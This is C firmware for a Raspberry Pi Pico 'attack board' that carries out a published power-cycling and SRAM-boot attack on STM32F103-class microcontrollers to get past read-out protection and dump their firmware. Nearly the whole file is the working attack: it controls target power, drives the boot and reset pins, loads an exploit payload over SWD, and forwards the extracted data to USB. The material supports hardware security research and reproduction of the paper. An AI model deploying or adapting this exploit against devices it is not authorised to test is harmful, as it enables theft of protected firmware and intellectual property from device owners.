/*
 * Copyright (C) 2023 Patrick Pedersen

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

 * Pi Pico Attack Board Firmware
 * Version: 1.2

 * This attack is based on the works of:
 *  Johannes Obermaier, Marc Schink and Kosma Moczek
 * The relevant paper can be found here, particularly section H3:
 *  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
 * And the relevant code can be found here:
 *  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 *
 */

#include <hardware/uart.h>
#include <hardware/pwm.h>
#include <hardware/watchdog.h>
#include <pico/bootrom.h>
#include <pico/stdlib.h>
#include <stdio.h>
#include <tusb.h>

#include "config.h"
#include "payload.h"

int bmp_loader_launcher(const char *data, uint32_t length, uint32_t offset);
int bmp_loader(const char *data, uint32_t length, uint32_t offset, bool check_only);

// Exact steps for attack:
//  Power pins high
//  Wait for serial input
//  Power pins low
//  Wait for reset to go low <- GPIO INPUT
//  Power pins high
//  Wait for SRAM firmware to run (Approx 15ms)
//  Set boot0 pin and reset pin to low
//  Wait for reset release (Approx 15ms)
//  Set reset to input
//  Forward UART to USB

// Note that there are three power pins. Each pin can source
// about 15 mA, so we gang three together to get a total
// of 45 mA or so. This is a bit low, and drives the target
// at 2.85V. Low, but enough for things to work.

#define LED_PIN PICO_DEFAULT_LED_PIN

static void target_power(bool on)
{
	if (on) {
		gpio_set_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
	} else {
		gpio_clr_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
	}
}

static int handle_control(uint32_t timeout_ms)
{
	int c = getchar_timeout_us(timeout_ms * 1000);
	if ((c == PICO_ERROR_TIMEOUT) || (c == '\0')) {
		return 0;
	}
	switch (c) {
	case 'b':
		printf("Bootloader mode selected\n");
		reset_usb_boot(0, 0);
		sleep_ms(10000);
		break;

	case 'r':
		printf("Restarting Pico\n");
		watchdog_reboot(0, 0, 10);
		sleep_ms(10000);
		break;

	case 'c':
		printf("Continuing explot\n");
		break;

	case 's':
		break;

	default:
		printf("Unrecognized key '%c' (0x%02x)", c, c);
		printf("Usage:\n");
		printf("    b    Reboot into bootloader mode\n");
		printf("    r    Restart Pico\n");
		printf("    c    Continue to stage 2\n");
		printf("    s    Send command\n");
		printf("\n");
		break;
	}
	return c;
}

static void validate_reset(void)
{
	if (!gpio_get(RESET_PIN)) {
		printf("Target is already in RESET! Ensure target is active before continuing.\r\n");
		while (!gpio_get(RESET_PIN)) {
			handle_control(500);
		}
	}
}

__attribute__((section(".data"))) static uint32_t powerdown_attack(void)
{
	// Drop the power
	gpio_put(LED_PIN, 1);
	target_power(false);

	// Wait for reset to go low
	uint32_t count = 0;
	while (gpio_get(RESET_PIN)) {
		count += 1;
		// tight_loop_contents();
	}

	// Immediately re-enable power
	target_power(true);
	return count;
}

static void send_word(uint32_t packet, uint8_t count)
{
	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
	for (int i = count; i > 0; i -= 1) {
		uint8_t bit = !!(packet & (1 << (i - 1)));
		gpio_put(SWDIO_PIN, bit);
		sleep_ms(1);
		gpio_put(SWCLK_PIN, 0);
		sleep_ms(1);
		gpio_put(SWCLK_PIN, 1);
	}
}

static uint32_t receive_word(uint8_t count)
{
	gpio_set_dir(SWDIO_PIN, GPIO_IN);
	uint32_t result = 0;
	for (int i = 0; i < count; i++) {
		gpio_put(SWCLK_PIN, 0);
		sleep_ms(1);
		result = (result << 1) | !!gpio_get(SWDIO_PIN);
		gpio_put(SWCLK_PIN, 1);
		sleep_ms(1);
	}
}

static uint32_t packet_txrx(uint32_t packet)
{
	send_word(0x5ad7, 16);
	sleep_ms(500);

	send_word(packet, 32);
	sleep_ms(500);

	// Turnaround
	receive_word(1);
	sleep_ms(500);

	uint32_t header = receive_word(16);
	sleep_ms(500);

	uint32_t response = receive_word(32);
	sleep_ms(500);

	// Turnaround
	receive_word(1);
	sleep_ms(500);

	if ((header & 0xffff) != 0x734f) {
		printf("Invalid header: Got %04x, expected 0x734f\n", header);
	}
	return response;
}

int main(void)
{
	stdio_init_all();

	// Delay enough time for the serial port to re-attach
	sleep_ms(1000);

	// Init GPIOs
	gpio_init(LED_PIN);
	gpio_init(SWDIO_PIN);
	gpio_init(SWCLK_PIN);
	gpio_init(POWER1_PIN);
	gpio_init(POWER2_PIN);
	gpio_init(POWER3_PIN);
	gpio_init(RESET_PIN);
	gpio_init(BOOT0_PIN);
	gpio_set_dir(LED_PIN, GPIO_OUT);
	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_pull_up(RESET_PIN);
	gpio_put(RESET_PIN, 0);
	gpio_set_dir(BOOT0_PIN, GPIO_OUT);

	// Init PWM for indicator LED
	gpio_set_function(LED_PIN, GPIO_FUNC_PWM);
	uint slice_num = pwm_gpio_to_slice_num(LED_PIN);
	pwm_set_wrap(slice_num, 255);
	pwm_set_chan_level(slice_num, PWM_CHAN_A, 0);
	pwm_set_enabled(slice_num, true);

	// -- Attack begins here --

	// Set BOOT0 to high and enable power. This will execute from SRAM, but since
	// there is no data there yet it will execute garbage and likely crash. Our
	// software will recover it.
	gpio_put(BOOT0_PIN, true);

	// Enable power
	// Ensure that the power pin set high before configuring it as output
	// to prevent the target from sinking current through the pin if the debug
	// probe is already attached
	target_power(false);
	gpio_set_dir(POWER1_PIN, GPIO_OUT);
	gpio_set_dir(POWER2_PIN, GPIO_OUT);
	gpio_set_dir(POWER3_PIN, GPIO_OUT);
	sleep_ms(100);
	target_power(true);

	gpio_put(LED_PIN, 0);

	// Validate that the target is no longer in reset.
	validate_reset();

	if (1) {
		while (bmp_loader_launcher(payload, sizeof(payload), 0x20000000) != 0) {
			printf("Target not found... retrying\n");
			handle_control(500);
		}

		gpio_set_dir(SWCLK_PIN, GPIO_OUT);
		gpio_set_dir(SWDIO_PIN, GPIO_OUT);
		gpio_put(SWCLK_PIN, true);
		gpio_put(SWDIO_PIN, true);

		printf("Booted directly into stage 2\n");
	} else {
		// Load the exploit firmware onto the target
		while (bmp_loader(payload, sizeof(payload), 0x20000000, false) != 0) {
			printf("Target not found... retrying\n");
			handle_control(500);
		}

		printf("Connected to target. Firmware is now loaded into SRAM. Device is in reset.\n");
		sleep_ms(100);

		// Set SWCLK and SWDIO pins to inputs to prevent them from powering the target.
		gpio_set_dir(SWCLK_PIN, GPIO_IN);
		gpio_set_dir(SWDIO_PIN, GPIO_IN);

		// Set BOOT0 to high to ensure the SRAM payload is executed
		gpio_put(BOOT0_PIN, true);

		// Deassert reset. This will boot into Stage 1 when power is reapplied.
		gpio_set_dir(RESET_PIN, GPIO_IN);

		uint32_t count;

		count = powerdown_attack();
		printf("Target powered off after %d ticks\n", count);

		sleep_ms(10);

		// Set SWCLK and SWDIO to outputs and drive them high. This
		// will be the basis of bidirectional communication.
		gpio_set_dir(SWCLK_PIN, GPIO_OUT);
		gpio_set_dir(SWDIO_PIN, GPIO_OUT);
		gpio_put(SWCLK_PIN, true);
		gpio_put(SWDIO_PIN, true);

		printf("Press 'c' to continue into stage 2\n");
		while (handle_control(500) != 'c') {
		}
		printf("Resetting target into stage 2\n");

		// Reset the board again with BOOT0 held low. This will cause it
		// to boot into stage 2.
		gpio_put(BOOT0_PIN, 0);
		gpio_set_dir(RESET_PIN, GPIO_OUT);
		sleep_ms(10);
		gpio_set_dir(RESET_PIN, GPIO_IN);
	}

	printf("Reading data from target...\n");

	// Forward dumped data from UART to USB serial
	int last_swclk = 0;
	int last_swdio = 0;
	while (true) {
		uint8_t c = handle_control(1);

		if (c == 's') {
			static uint32_t index = 0;
			uint32_t response = packet_txrx(index);
			printf("Sent 0x%08x, received 0x%08x\n", index, response);
			index += 1;
			if (index > 6) {
				index = 0;
			}
		}

	}
}
